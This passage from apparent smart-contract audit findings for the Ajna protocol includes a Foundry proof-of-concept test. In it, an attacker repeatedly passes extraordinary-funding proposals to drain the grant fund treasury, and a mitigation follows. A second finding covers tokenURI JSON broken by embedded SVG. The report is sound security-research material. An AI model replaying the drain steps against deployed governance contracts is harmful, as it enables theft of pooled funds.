assertEq(_token.totalSupply(), 1_000_000_000 * 1e18);       assertEq(_grantFund.treasury(), 150_000_000 * 1e18);       assertEq(_grantFund.getSliceOfNonTreasury(1e18), 850_000_000 * 1e18);        /*         After the 1st proposal has succeed, the attacker now can drain the treasury alone, without the previous delegators.          This happens because the formula actually makes it easier to execute further extraordinary proposals.          For example the previous proposal required 71.4% of non-treasury tokens to pass a proposal of 50% of treasury tokens.          I will show how the second proposal will only require 62.94% of non-treasury tokens to pass a proposal of 45% of treasury tokens.         Which is a slightly increase from 500M needed to 535M needed, that is only a 7% difficulty increase. Whereas the attacker increased his         voting power from 385M to 535M (thanks to proposal 1) which is a 39% increase in his voting power.       */        // Holders now delegates for them       _delegateTo(_token, _votersArrAttacker, _votersArrAttacker);       _delegateTo(_token, _votersArr, _votersArr);               vm.roll(_startBlock2 + 500);        // set proposal params       uint256 endBlockParam2 = block.number + 100_000;        // 67.5 tokens requested, that is 45% of treasury       uint256 tokensRequestedParam2 = 67_500_000 * 1e18;        // generate proposal targets       address[] memory targets2 = new address[](1);       targets2[0] = address(_token);        // generate proposal values       uint256[] memory values2 = new uint256[](1);       values2[0] = 0;        // generate proposal calldata       bytes[] memory calldatas2 = new bytes[](1);       calldatas2[0] = abi.encodeWithSignature(         \"transfer(address,uint256)\",         _attacker,         tokensRequestedParam2       );        // create and submit proposal       TestProposalExtraordinary memory testProposal2 = _createProposalExtraordinary(         _grantFund,         _attacker,         endBlockParam2,         targets2,         values2,         calldatas2,         \"Thanks for proposal 1, now I will drain the treasury\"       );        // Attacker has 535M of voting power which is ~ 62.94% of Non-Treasury Tokens       uint256 attackerVotingPowerForEP2 = _grantFund.getVotesExtraordinary(_attacker, testProposal2.proposalId);       assertEq(attackerVotingPowerForEP2, 535_000_000 * 1e18);         changePrank(_attacker);       _grantFund.voteExtraordinary(testProposal2.proposalId);        // Attacher succeed       IFunding.ProposalState proposalState2 = _grantFund.state(testProposal2.proposalId);       assertEq(uint8(proposalState2), uint8(IFunding.ProposalState.Succeeded));        // execute proposal       _grantFund.executeExtraordinary(targets2, values2, calldatas2, keccak256(bytes(testProposal2.description)));        // Attacker balance is now 602.5M       assertEq(_token.balanceOf(_attacker), 602_500_000 * 1e18);        // The attacker can continue requesting (1- MiniumThreshold)% of the treasury until threshold becomes 100%.     }      function _delegateToDelegatees(IAjnaToken token_, address delegator_, address delegatee_) internal {         changePrank(delegator_);         token_.delegate(delegatee_);     }      function _delegateTo(IAjnaToken token_, address[] memory delegators_, address[] memory delegatees_) internal {         for (uint256 i = 0; i < delegators_.length; ++i) {             _delegateToDelegatees(token_, delegators_[i], delegatees_[i]);         }     } } ```  3.- Run `forge test --match-contract ExploitEF --match-test test_drainTreasury`   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Re-write the constraint as follows:  `votesReceived >= _getSliceOfNonTreasury(percentageOfTreasuryTokensRequested) + _getSliceOfNonTreasury(minThresholdPercentage)`                ## Assessed type  Governance"}, {"title": "Representing SVG directly in JSON breaks structure's it", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/161", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L534 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/PositionNFTSVG.sol#L54   # Vulnerability details  ## Impact `PostionManager.sol#tokenURI()` return encode json with `owner, image...` fields, where svg present in unceoded view of svg as a field in json results in the fact that this json will always not be decoded. Since SVG breaks json structure,  **Which leads to the fact that this part of the important functionality of the ERC721 standard does not work correctly**  ## Proof of Concept When calling `PostionManager.sol#tokenURI()` ```c File: ajna-core\\src\\PositionManager.sol  517:     function tokenURI( 518:         uint256 tokenId_ 519:     ) public view override(ERC721) returns (string memory) {               525:         PositionNFTSVG.ConstructTokenURIParams memory params = PositionNFTSVG.ConstructTokenURIParams({ 526:             collateralTokenSymbol: tokenSymbol(collateralTokenAddress), 527:             quoteTokenSymbol:      tokenSymbol(quoteTokenAddress), 528:             tokenId:               tokenId_, 529:             pool:                  poolKey[tokenId_], 530:             owner:                 ownerOf(tokenId_), 531:             indexes:               positionIndexes[tokenId_].values() 532:         }); 533:  534:         return PositionNFTSVG.constructTokenURI(params); 535:     }  ``` The `PositionNFTSVG` library is called to construct an SVG in which the `image` field is a pure SVG element ```javascript File: ajna-core\\src\\libraries\\external\\PositionNFTSVG.sol  36:         string memory image = _generateSVGofTokenById(params_);  69:     function _generateSVGofTokenById(ConstructTokenURIParams memory params_) internal pure returns (string memory svg_) { 70:         svg_ = string( 71:             abi.encodePacked( 72:                 '<svg fill=\"none\" viewBox=\"0 0 512 512\" xmlns=\"http://www.w3.org/2000/svg\">', 73:                     _generateBackground(), 74:                     _generateSVGDefs(), 75:                     _generatePoolTag(params_.collateralTokenSymbol, params_.quoteTokenSymbol), 76:                     _generateTokenIdTag(params_.tokenId), 77:                 \"</svg>\" 78:             ) 79:         ); 80:     }  ``` which is later inserted into the json object ```javascript  File: ajna-core\\src\\libraries\\external\\PositionNFTSVG.sol  43:         return string( 44:             abi.encodePacked( 45:                 \"data:application/json;base64,\", 46:                 Base64.encode( 47:                     bytes( 48:                         abi.encodePacked( 49:                             '{\"name\":\"', 50:                             name, 51:                             '\", \"description\":\"', 52:                             description, 53:                             '\", \"image\":\"', 54:                             image, 55:                             '\", \"owner\":\"', 56:                             ownerHexString, 57:                             '\"}' 58:                         ) 59:                     ) 60:                 ) 61:             ) 62:         ); ```   **which leads to the fact that symbols that are structural for json are present in the svg component and break the entire json object, we can see this after decoding the result of the string, and trying to read this object/formating it as json**  --- tests: ```diff diff --git a/ajna-core/tests/forge/unit/PositionManager.t.sol b/ajna-core/tests/forge/unit/PositionManager.t.sol index bf3aa40..5d7af0c 100644 --- a/ajna-core/tests/forge/unit/PositionManager.t.sol +++ b/ajna-core/tests/forge/unit/PositionManager.t.sol @@ -15,6 +15,7 @@ import 'src/interfaces/pool/commons/IPoolErrors.sol';   import '../utils/ContractNFTRecipient.sol';  import '../utils/ContractNFTSpender.sol'; +import '@std/console2.sol';   abstract contract PositionManagerERC20PoolHelperContract is ERC20HelperContract {  @@ -2620,10 +2621,12 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract          _positionManager.memorializePositions(memorializeParams);           string memory uriString = _positionManager.tokenURI(tokenId); +        console2.log(\"uriString\", uriString);          // emit log(uriString);          assertGt(bytes(uriString).length, 0);      } ``` tokenURI result: ```text data:application/json;base64,eyJuYW1lIjoiQWpuYSBUb2tlbiAjMSIsICJkZXNjcmlwdGlvbiI6IkFqbmEgUG9zaXRpb25zIE5GVC1WMSIsICJpbWFnZSI6IjxzdmcgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDUxMiA1MTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzExNV81MSkiPjxyZWN0IHdpZHRoPSI1MTIiIGhlaWdodD0iNTEyIiByeD0iMzIiIGZpbGw9InVybCgjcGFpbnQwX2xpbmVhcl8xMTVfNTEpIi8+PHJlY3Qgd2lkdGg9IjUxMiIgaGVpZ2h0PSI1MTIiIHJ4PSIzMiIgZmlsbD0iYmxhY2siIGZpbGwtb3BhY2l0eT0iMC41Ii8+PGcgZmlsdGVyPSJ1cmwoI2ZpbHRlcjBfZl8xMTVfNTEpIj48ZWxsaXBzZSBjeD0iMzc0IiBjeT0iMzkwLjUiIHJ4PSIxMjIiIHJ5PSIxMjEuNSIgZmlsbD0iI0I0NUNENiIvPjxjaXJjbGUgY3g9IjE1NyIgY3k9IjMxNSIgcj0iMTIyIiBmaWxsPSIjMzdGQ0ZCIi8+PGVsbGlwc2UgY3g9IjEzNy43ODMiIGN5PSIxMzcuNSIgcng9IjEyMS43ODMiIHJ5PSIxMjEuNSIgZmlsbD0iIzY0MkREMiIvPjwvZz48cmVjdCBvcGFjaXR5PSIwLjUiIHg9IjE2LjUiIHk9IjE2LjUiIHdpZHRoPSI0NzkiIGhlaWdodD0iNDc5IiByeD0iMjMuNSIgZmlsbD0iYmxhY2siIHN0cm9rZT0id2hpdGUiLz48Y2lyY2xlIGN4PSIyNTYiIGN5PSIyNTYiIHI9IjIyOC41IiBzdHJva2U9IndoaXRlIi8+PGNpcmNsZSBjeD0iMjU2IiBjeT0iMjU2IiByPSIyMTkuNSIgc3Ryb2tlPSJ3aGl0ZSIvPjxwYXRoIGQ9Ik00MTAuMjczIDQ2N0M0MTAuMjA0IDQ2NyA0MTAuMTM5IDQ2Ni45NzQgNDEwLjA3OCA0NjYuOTIyQzQxMC4wMjYgNDY2Ljg2MSA0MTAgNDY2Ljc5NiA0MTAgNDY2LjcyN0M0MTAgNDY2LjY4NCA0MTAuMDA0IDQ2Ni42NDUgNDEwLjAxMyA0NjYuNjFMNDEzLjA2OCA0NTguMjY0QzQxMy4wOTQgNDU4LjE2OSA0MTMuMTQ2IDQ1OC4wODYgNDEzLjIyNCA0NTguMDE3QzQxMy4zMTEgNDU3LjkzOSA0MTMuNDI4IDQ1Ny45IDQxMy41NzUgNDU3LjlINDE1LjQ5OUM0MTUuNjQ2IDQ1Ny45IDQxNS43NTkgNDU3LjkzOSA0MTUuODM3IDQ1OC4wMTdDNDE1LjkyNCA0NTguMDg2IDQxNS45OCA0NTguMTY5IDQxNi4wMDYgNDU4LjI2NEw0MTkuMDQ4IDQ2Ni42MUM0MTkuMDY1IDQ2Ni42NDUgNDE5LjA3NCA0NjYuNjg0IDQxOS4wNzQgNDY2LjcyN0M0MTkuMDc0IDQ2Ni43OTYgNDE5LjA0NCA0NjYuODYxIDQxOC45ODMgNDY2LjkyMkM0MTguOTMxIDQ2Ni45NzQgNDE4Ljg2NiA0NjcgNDE4Ljc4OCA0NjdINDE3LjE4OUM0MTcuMDU5IDQ2NyA0MTYuOTU5IDQ2Ni45NyA0MTYuODkgNDY2LjkwOUM0MTYuODI5IDQ2Ni44NCA0MTYuNzkgNDY2Ljc3OSA0MTYuNzczIDQ2Ni43MjdMNDE2LjI2NiA0NjUuNDAxSDQxMi43OTVMNDEyLjMwMSA0NjYuNzI3QzQxMi4yODQgNDY2Ljc3OSA0MTIuMjQ1IDQ2Ni44NCA0MTIuMTg0IDQ2Ni45MDlDNDEyLjEyMyA0NjYuOTcgNDEyLjAxOSA0NjcgNDExLjg3MiA0NjdINDEwLjI3M1pNNDEzLjMyOCA0NjMuNTI5SDQxNS43NDZMNDE0LjUyNCA0NjAuMDk3TDQxMy4zMjggNDYzLjUyOVoiIGZpbGw9IndoaXRlIi8+PHBhdGggZD0iTTQzMS4xMTggNDY3LjEzQzQzMC42MjQgNDY3LjEzIDQzMC4xNTEgNDY3LjA2OSA0MjkuNzAxIDQ2Ni45NDhDNDI5LjI1OSA0NjYuODE4IDQyOC44NjQgNDY2LjYyNyA0MjguNTE4IDQ2Ni4zNzZDNDI4LjE3MSA0NjYuMTI1IDQyNy44OTQgNDY1LjgxMyA0MjcuNjg2IDQ2NS40NEM0MjcuNDg2IDQ2NS4wNjcgNDI3LjM3OCA0NjQuNjM0IDQyNy4zNjEgNDY0LjE0QzQyNy4zNjEgNDY0LjA2MiA0MjcuMzg3IDQ2My45OTcgNDI3LjQzOSA0NjMuOTQ1QzQyNy40OTEgNDYzLjg4NCA0MjcuNTYgNDYzLjg1NCA0MjcuNjQ3IDQ2My44NTRINDI5LjQwMkM0MjkuNTIzIDQ2My44NTQgNDI5LjYxNCA0NjMuODg0IDQyOS42NzUgNDYzLjk0NUM0MjkuNzQ0IDQ2NC4wMDYgNDI5LjggNDY0LjA5NyA0MjkuODQ0IDQ2NC4yMThDNDI5Ljg4NyA0NjQuNDYxIDQyOS45NjkgNDY0LjY2IDQzMC4wOTEgNDY0LjgxNkM0MzAuMjEyIDQ2NC45NjMgNDMwLjM2NCA0NjUuMDc2IDQzMC41NDYgNDY1LjE1NEM0MzAuNzM2IDQ2NS4yMjMgNDMwLjk0OSA0NjUuMjU4IDQzMS4xODMgNDY1LjI1OEM0MzEuNjE2IDQ2NS4yNTggNDMxLjk1IDQ2NS4xMTkgNDMyLjE4NCA0NjQuODQyQzQzMi40MTggNDY0LjU1NiA0MzIuNTM1IDQ2NC4xNCA0MzIuNTM1IDQ2My41OTRWNDU5LjgzN0g0MjguMzIzQzQyOC4yMzYgNDU5LjgzNyA0MjguMTU4IDQ1OS44MDcgNDI4LjA4OSA0NTkuNzQ2QzQyOC4wMjggNDU5LjY4NSA0MjcuOTk4IDQ1OS42MDcgNDI3Ljk5OCA0NTkuNTEyVjQ1OC4yMjVDNDI3Ljk5OCA0NTguMTMgNDI4LjAyOCA0NTguMDUyIDQyOC4wODkgNDU3Ljk5MUM0MjguMTU4IDQ1Ny45MyA0MjguMjM2IDQ1Ny45IDQyOC4zMjMgNDU3LjlINDM0LjYxNUM0MzQuNzEgNDU3LjkgNDM0Ljc4OCA0NTcuOTMgNDM0Ljg0OSA0NTcuOTkxQzQzNC45MTggNDU4LjA1MiA0MzQuOTUzIDQ1OC4xMyA0MzQuOTUzIDQ1OC4yMjVWNDYzLjY1OUM0MzQuOTUzIDQ2NC40MTMgNDM0Ljc4OCA0NjUuMDUgNDM0LjQ1OSA0NjUuNTdDNDM0LjEyOSA0NjYuMDgxIDQzMy42NzkgNDY2LjQ3MSA0MzMuMTA3IDQ2Ni43NEM0MzIuNTM1IDQ2NyA0MzEuODcyIDQ2Ny4xMyA0MzEuMTE4IDQ2Ny4xM1oiIGZpbGw9IndoaXRlIi8+PHBhdGggZD0iTTQ0NS4wMDYgNDY3QzQ0NC45MSA0NjcgNDQ0LjgzMiA0NjYuOTcgNDQ0Ljc3MiA0NjYuOTA5QzQ0NC43MTEgNDY2Ljg0OCA0NDQuNjgxIDQ2Ni43NyA0NDQuNjgxIDQ2Ni42NzVWNDU4LjIyNUM0NDQuNjgxIDQ1OC4xMyA0NDQuNzExIDQ1OC4wNTIgNDQ0Ljc3MiA0NTcuOTkxQzQ0NC44MzIgNDU3LjkzIDQ0NC45MSA0NTcuOSA0NDUuMDA2IDQ1Ny45SDQ0Ni4zODRDNDQ2LjUzMSA0NTcuOSA0NDYuNjM1IDQ1Ny45MzUgNDQ2LjY5NiA0NTguMDA0QzQ0Ni43NjUgNDU4LjA2NSA0NDYuODA4IDQ1OC4xMTIgNDQ2LjgyNiA0NTguMTQ3TDQ0OS45OTggNDYzLjE1MlY0NTguMjI1QzQ0OS45OTggNDU4LjEzIDQ1MC4wMjggNDU4LjA1MiA0NTAuMDg5IDQ1Ny45OTFDNDUwLjE0OSA0NTcuOTMgNDUwLjIyNyA0NTcuOSA0NTAuMzIzIDQ1Ny45SDQ1MS44ODNDNDUxLjk3OCA0NTcuOSA0NTIuMDU2IDQ1Ny45MyA0NTIuMTE3IDQ1Ny45OTFDNDUyLjE3NyA0NTguMDUyIDQ1Mi4yMDggNDU4LjEzIDQ1Mi4yMDggNDU4LjIyNVY0NjYuNjc1QzQ1Mi4yMDggNDY2Ljc2MiA0NTIuMTc3IDQ2Ni44NCA0NTIuMTE3IDQ2Ni45MDlDNDUyLjA1NiA0NjYuOTcgNDUxLjk3OCA0NjcgNDUxLjg4MyA0NjdINDUwLjQ5MkM0NTAuMzUzIDQ2NyA0NTAuMjQ5IDQ2Ni45NjUgNDUwLjE4IDQ2Ni44OTZDNDUwLjExOSA0NjYuODI3IDQ1MC4wOCA0NjYuNzc5IDQ1MC4wNjMgNDY2Ljc1M0w0NDYuODkxIDQ2MS45NDNWNDY2LjY3NUM0NDYuODkxIDQ2Ni43NyA0NDYuODYgNDY2Ljg0OCA0NDYuOCA0NjYuOTA5QzQ0Ni43MzkgNDY2Ljk3IDQ0Ni42NjEgNDY3IDQ0Ni41NjYgNDY3SDQ0NS4wMDZaIiBmaWxsPSJ3aGl0ZSIvPjxwYXRoIGQ9Ik00NjEuNTA0IDQ2N0M0NjEuNDM1IDQ2NyA0NjEuMzcgNDY2Ljk3NCA0NjEuMzA5IDQ2Ni45MjJDNDYxLjI1NyA0NjYuODYxIDQ2MS4yMzEgNDY2Ljc5NiA0NjEuMjMxIDQ2Ni43MjdDNDYxLjIzMSA0NjYuNjg0IDQ2MS4yMzYgNDY2LjY0NSA0NjEuMjQ0IDQ2Ni42MUw0NjQuMjk5IDQ1OC4yNjRDNDY0LjMyNSA0NTguMTY5IDQ2NC4zNzcgNDU4LjA4NiA0NjQuNDU1IDQ1OC4wMTdDNDY0LjU0MiA0NTcuOTM5IDQ2NC42NTkgNDU3LjkgNDY0LjgwNiA0NTcuOUg0NjYuNzNDNDY2Ljg3OCA0NTcuOSA0NjYuOTkgNDU3LjkzOSA0NjcuMDY4IDQ1OC4wMTdDNDY3LjE1NSA0NTguMDg2IDQ2Ny4yMTEgNDU4LjE2OSA0NjcuMjM3IDQ1OC4yNjRMNDcwLjI3OSA0NjYuNjFDNDcwLjI5NyA0NjYuNjQ1IDQ3MC4zMDUgNDY2LjY4NCA0NzAuMzA1IDQ2Ni43MjdDNDcwLjMwNSA0NjYuNzk2IDQ3MC4yNzUgNDY2Ljg2MSA0NzAuMjE0IDQ2Ni45MjJDNDcwLjE2MiA0NjYuOTc0IDQ3MC4wOTcgNDY3IDQ3MC4wMTkgNDY3SDQ2OC40MkM0NjguMjkgNDY3IDQ2OC4xOTEgNDY2Ljk3IDQ2OC4xMjEgNDY2LjkwOUM0NjguMDYxIDQ2Ni44NCA0NjguMDIyIDQ2Ni43NzkgNDY4LjAwNCA0NjYuNzI3TDQ2Ny40OTcgNDY1LjQwMUg0NjQuMDI2TDQ2My41MzIgNDY2LjcyN0M0NjMuNTE1IDQ2Ni43NzkgNDYzLjQ3NiA0NjYuODQgNDYzLjQxNSA0NjYuOTA5QzQ2My4zNTUgNDY2Ljk3IDQ2My4yNTEgNDY3IDQ2My4xMDMgNDY3SDQ2MS41MDRaTTQ2NC41NTkgNDYzLjUyOUg0NjYuOTc3TDQ2NS43NTUgNDYwLjA5N0w0NjQuNTU5IDQ2My41MjlaIiBmaWxsPSJ3aGl0ZSIvPjxwYXRoIGQ9Ik0xMDYuMTc4IDE2OS41TDI1NiA0MjlMNDA1LjgyMiAxNjkuNUgxMDYuMTc4WiIgc3Ryb2tlPSJ3aGl0ZSIvPjxwYXRoIGQ9Ik0xMDYuMTc4IDM0Mi41TDI1NiA4M0w0MDUuODIyIDM0Mi41SDEwNi4xNzhaIiBzdHJva2U9IndoaXRlIi8+PGNpcmNsZSBjeD0iMjU2IiBjeT0iMjU2IiByPSI3MS41IiBzdHJva2U9IndoaXRlIi8+PGNpcmNsZSBjeD0iMjU2IiBjeT0iMjU2IiByPSIyMCIgZmlsbD0iIzk3NEVFQSIvPjxjaXJjbGUgY3g9IjI2NCIgY3k9IjI0OCIgcj0iNCIgZmlsbD0id2hpdGUiLz48cGF0aCBkPSJNNDA2LjUgMTcwTDI1NiA4Mi41TDEwNiAxNzBWMzQyLjVMMjU2IDQyOS41TDQwNi41IDM0Mi41VjE3MFoiIHN0cm9rZT0id2hpdGUiLz48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTI3NC4xMTcgNzQuNDg1M0MyNjguMjY1IDY4LjkyMTEgMjYyLjI0OCA2NiAyNTYuMSA2NkMyNDkuOTUxIDY2IDI0My45MzUgNjguOTIxMSAyMzguMDgyIDc0LjQ4NTNDMjM3LjU4MiA3NC45NjE0IDIzNy41NjIgNzUuNzUzIDIzOC4wMzkgNzYuMjUzNEMyMzguNTE1IDc2Ljc1MzcgMjM5LjMwNyA3Ni43NzMzIDIzOS44MDggNzYuMjk3MkMyNDUuMzcyIDcxLjAwNzIgMjUwLjgwMiA2OC41MDExIDI1Ni4xIDY4LjUwMTFDMjYxLjM5MyA2OC41MDExIDI2Ni44MTggNzEuMDAzIDI3Mi4zNzcgNzYuMjgzN0MyNzIuNDY0IDc2LjM3MzkgMjcyLjUzNSA3Ni40OTc5IDI3Mi41NzYgNzYuNjI3MkMyNzIuNTYyIDc2LjcwMzYgMjcyLjU1NCA3Ni43ODI0IDI3Mi41NTQgNzYuODYzQzI3Mi41NTQgNzcuMTU4NSAyNzIuNDU3IDc3LjMxNzUgMjcyLjM3OCA3Ny4zODUzQzI3Mi4zNjEgNzcuMzk5OSAyNzIuMzQ0IDc3LjQxNSAyNzIuMzI4IDc3LjQzMDVDMjcyLjE5MSA3Ny41NjA1IDI3Mi4wNTUgNzcuNjg4OCAyNzEuOTE5IDc3LjgxNTVDMjY2LjczOCA3My41MDggMjYxLjQ1NCA3MS4yNTgzIDI1Ni4wNjkgNzEuMjU4M0MyNTAuMzk1IDcxLjI1ODMgMjQ0LjgzMyA3My43NTU0IDIzOS4zODYgNzguNTI1MkMyMzkuMzc2IDc4LjUzMzUgMjM5LjM2NiA3OC41NDE5IDIzOS4zNTYgNzguNTUwNkwyMzkuMzQyIDc4LjU2MjFDMjM4LjkyNSA3OC45MTkyIDIzOC40NzEgNzkuMzA4NiAyMzguMDEyIDc5Ljc2NUMyMzYuNzU5IDgwLjk0MDYgMjM2LjY2MSA4Mi44OTg3IDIzNy43NjYgODQuMjQxNUMyMzcuNzczIDg0LjI1MzIgMjM3Ljc4MSA4NC4yNjQ5IDIzNy43ODggODQuMjc2NkMyMzcuODk2IDg0LjQzNzcgMjM4LjAyNCA4NC41NTMyIDIzOC4xNDUgODQuNjM0NkMyNDMuOTU4IDkwLjEyMDkgMjQ5LjkzMSA5MyAyNTYuMDM2IDkzQzI2Mi4xODQgOTMgMjY4LjIwMSA5MC4wNzg5IDI3NC4wNTMgODQuNTE0N0MyNzQuNTU0IDg0LjAzODYgMjc0LjU3MyA4My4yNDcgMjc0LjA5NyA4Mi43NDY3QzI3My42MiA4Mi4yNDYzIDI3Mi44MjggODIuMjI2NyAyNzIuMzI3IDgyLjcwMjhDMjY2Ljc2NCA4Ny45OTI4IDI2MS4zMzMgOTAuNDk4OSAyNTYuMDM2IDkwLjQ5ODlDMjUwLjczOCA5MC40OTg5IDI0NS4zMDggODcuOTkyOCAyMzkuNzQ0IDgyLjcwMjhMMjM5LjczNSA4Mi42OTQ0QzIzOS4zOTYgODIuMzI3NCAyMzkuNDU4IDgxLjgzNTYgMjM5LjczIDgxLjU4NDFDMjM5Ljc0MyA4MS41NzI4IDIzOS43NTUgODEuNTYxMyAyMzkuNzY3IDgxLjU0OTVDMjM5LjkwNCA4MS40MTIyIDI0MC4wNDIgODEuMjgxNCAyNDAuMTgyIDgxLjE1MzNDMjQ1LjU5NiA4NS42NjE2IDI1MS4xMjQgODcuOTI4OSAyNTYuNzQ5IDg3LjczM0MyNjIuMTQxIDg3LjU0NTEgMjY3LjQxOSA4NS4xMDEyIDI3Mi41OCA4MC41ODlDMjcyLjY5OSA4MC41MjE4IDI3Mi44MDkgODAuNDMzNyAyNzIuOTA1IDgwLjMyNTJDMjcyLjkyOCA4MC4yOTg1IDI3Mi45NTEgODAuMjcxIDI3Mi45NzEgODAuMjQzQzI3My4zMjcgNzkuOTI0OCAyNzMuNjgxIDc5LjU5NjkgMjc0LjAzNiA3OS4yNTkzQzI3NC42NDggNzguNzIxMSAyNzQuOTM4IDc4LjAxMDIgMjc1LjAyNiA3Ny4zMzYxQzI3NS4wODYgNzcuMTkwMiAyNzUuMTE5IDc3LjAzMDQgMjc1LjExOSA3Ni44NjNDMjc1LjExOSA3NS45NjQyIDI3NC43MzEgNzUuMDk4NCAyNzQuMTM5IDc0LjUwN0MyNzQuMTMxIDc0LjQ5OTcgMjc0LjEyNCA3NC40OTI1IDI3NC4xMTcgNzQuNDg1M1pNMjU2LjA2OSA3My43NTk0QzI2MC42MTEgNzMuNzU5NCAyNjUuMjUgNzUuNjA4NCAyNzAuMDEyIDc5LjQ4NjRDMjY1LjQ2NiA4My4yMjA2IDI2MS4wMTkgODUuMDgxNSAyNTYuNjYyIDg1LjIzMzRDMjUxLjkyNyA4NS4zOTgzIDI0Ny4wODUgODMuNTUyMyAyNDIuMTA5IDc5LjQ5OTRDMjQ2Ljg3NyA3NS42MTI2IDI1MS41MjEgNzMuNzU5NCAyNTYuMDY5IDczLjc1OTRaIiBmaWxsPSJ3aGl0ZSIvPjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMjU2LjA1OSA3NC44MzI1QzI1My40OTIgNzQuODMyNSAyNTEuNDExIDc2LjkxMzggMjUxLjQxMSA3OS40ODEyQzI1MS40MTEgODIuMDQ4NiAyNTMuNDkyIDg0LjEyOTkgMjU2LjA1OSA4NC4xMjk5QzI1OC42MjcgODQuMTI5OSAyNjAuNzA4IDgyLjA0ODYgMjYwLjcwOCA3OS40ODEyQzI2MC43MDggNzYuOTEzOCAyNTguNjI3IDc0LjgzMjUgMjU2LjA1OSA3NC44MzI1Wk0yNTYuMDYgODIuMjcwNEMyNTcuNiA4Mi4yNzA0IDI1OC44NDkgODEuMDIxNiAyNTguODQ5IDc5LjQ4MTJDMjU4Ljg0OSA3Ny45NDA4IDI1Ny42IDc2LjY5MiAyNTYuMDYgNzYuNjkyQzI1NC41MTkgNzYuNjkyIDI1My4yNyA3Ny45NDA4IDI1My4yNyA3OS40ODEyQzI1My4yNyA4MS4wMjE2IDI1NC41MTkgODIuMjcwNCAyNTYuMDYgODIuMjcwNFoiIGZpbGw9IndoaXRlIi8+PHBhdGggb3BhY2l0eT0iMC41IiBkPSJNMTU0LjUgMTc2QzE1NC41IDE5OC45MTQgMTM1LjcwMiAyMTcuNSAxMTIuNSAyMTcuNUM4OS4yOTg0IDIxNy41IDcwLjUgMTk4LjkxNCA3MC41IDE3NkM3MC41IDE1My4wODYgODkuMjk4NCAxMzQuNSAxMTIuNSAxMzQuNUMxMzUuNzAyIDEzNC41IDE1NC41IDE1My4wODYgMTU0LjUgMTc2WiIgc3Ryb2tlPSJ3aGl0ZSIvPjxjaXJjbGUgb3BhY2l0eT0iMC41IiBjeD0iMjU2LjUiIGN5PSI4OS41IiByPSI0MiIgc3Ryb2tlPSJ3aGl0ZSIvPjxjaXJjbGUgb3BhY2l0eT0iMC41IiBjeD0iMjU2LjUiIGN5PSI0MjIuNSIgcj0iNDIiIHN0cm9rZT0id2hpdGUiLz48cGF0aCBvcGFjaXR5PSIwLjUiIGQ9Ik0xNTQuNSAzMzdDMTU0LjUgMzU5LjkxNCAxMzUuNzAyIDM3OC41IDExMi41IDM3OC41Qzg5LjI5ODQgMzc4LjUgNzAuNSAzNTkuOTE0IDcwLjUgMzM3QzcwLjUgMzE0LjA4NiA4OS4yOTg0IDI5NS41IDExMi41IDI5NS41QzEzNS43MDIgMjk1LjUgMTU0LjUgMzE0LjA4NiAxNTQuNSAzMzdaIiBzdHJva2U9IndoaXRlIi8+PHBhdGggb3BhY2l0eT0iMC41IiBkPSJNNDQxLjUgMTc2QzQ0MS41IDE5OC45MTQgNDIyLjcwMiAyMTcuNSAzOTkuNSAyMTcuNUMzNzYuMjk4IDIxNy41IDM1Ny41IDE5OC45MTQgMzU3LjUgMTc2QzM1Ny41IDE1My4wODYgMzc2LjI5OCAxMzQuNSAzOTkuNSAxMzQuNUM0MjIuNzAyIDEzNC41IDQ0MS41IDE1My4wODYgNDQxLjUgMTc2WiIgc3Ryb2tlPSJ3aGl0ZSIvPjxwYXRoIG9wYWNpdHk9IjAuNSIgZD0iTTQ0MS41IDMzN0M0NDEuNSAzNTkuOTE0IDQyMi43MDIgMzc4LjUgMzk5LjUgMzc4LjVDMzc2LjI5OCAzNzguNSAzNTcuNSAzNTkuOTE0IDM1Ny41IDMzN0MzNTcuNSAzMTQuMDg2IDM3Ni4yOTggMjk1LjUgMzk5LjUgMjk1LjVDNDIyLjcwMiAyOTUuNSA0NDEuNSAzMTQuMDg2IDQ0MS41IDMzN1oiIHN0cm9rZT0id2hpdGUiLz48Y2lyY2xlIGN4PSIyNTYiIGN5PSIyNTYiIHI9IjM1LjUiIHN0cm9rZT0id2hpdGUiLz48cGF0aCBkPSJNMTk1LjM3OCAyMjFMMjU2IDMyNkwzMTYuNjIyIDIyMUgxOTUuMzc4WiIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLXdpZHRoPSIyIi8+PC9nPjxkZWZzPjxmaWx0ZXIgaWQ9ImZpbHRlcjBfZl8xMTVfNTEiIHg9Ii0xODQiIHk9Ii0xODQiIHdpZHRoPSI4ODAiIGhlaWdodD0iODk2IiBmaWx0ZXJVbml0cz0idXNlclNwYWNlT25Vc2UiIGNvbG9yLWludGVycG9sYXRpb24tZmlsdGVycz0ic1JHQiI+PGZlRmxvb2QgZmxvb2Qtb3BhY2l0eT0iMCIgcmVzdWx0PSJCYWNrZ3JvdW5kSW1hZ2VGaXgiLz48ZmVCbGVuZCBtb2RlPSJub3JtYWwiIGluPSJTb3VyY2VHcmFwaGljIiBpbjI9IkJhY2tncm91bmRJbWFnZUZpeCIgcmVzdWx0PSJzaGFwZSIvPjxmZUdhdXNzaWFuQmx1ciBzdGREZXZpYXRpb249IjEwMCIgcmVzdWx0PSJlZmZlY3QxX2ZvcmVncm91bmRCbHVyXzExNV81MSIvPjwvZmlsdGVyPjxsaW5lYXJHcmFkaWVudCBpZD0icGFpbnQwX2xpbmVhcl8xMTVfNTEiIHgxPSIxNS4wNTg4IiB5MT0iMTUyLjYxNSIgeDI9IjUxMiIgeTI9IjE1Mi42MTUiIGdyYWRpZW50VW5